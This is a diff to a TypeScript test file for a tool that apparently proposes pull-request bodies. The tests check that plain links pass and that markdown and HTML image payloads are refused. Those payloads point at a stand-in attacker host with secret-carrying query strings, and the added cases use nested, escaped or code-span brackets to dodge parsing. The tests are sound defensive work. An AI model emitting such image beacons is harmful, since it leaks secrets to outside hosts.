@@ -155,7 +155,8 @@ describe("a repository without checks", () => {
 		const { run, call, proposed } = setup([]);
 		run.targets.tainted = true;
 		run.targets.mode = "enforce";
-		const body = "See https://elsewhere.example";
+		const body =
+			"See https://elsewhere.example, [the docs](https://elsewhere.example/docs) and [`cart()`](<https://elsewhere.example/api>).";
 		await call({ title: "Fix the cart", body });
 		expect(proposed[0]?.body).toContain(body);
 	});
@@ -163,6 +164,11 @@ describe("a repository without checks", () => {
 		"![chart](https://collector.attacker.example/?d=secret)",
 		'<img alt="" src="https://collector.attacker.example/p.png">',
 		"![chart][1]\n\n[1]: https://collector.attacker.example/p.png",
+		// An image's description may nest brackets, escape them, or hide one in a code span.
+		"![a [b] c](https://collector.attacker.example/leak?data=SECRET)",
+		"![a \\] b](https://collector.attacker.example/leak)",
+		"![a `]` b](https://collector.attacker.example/leak)",
+		"![a [b](https://elsewhere.example) c](https://collector.attacker.example/leak)",
 	])("refuses an image the repository's page would fetch, in enforce mode: %s", async (body) => {
 		const { run, call, proposed } = setup([]);
 		run.targets.tainted = true;
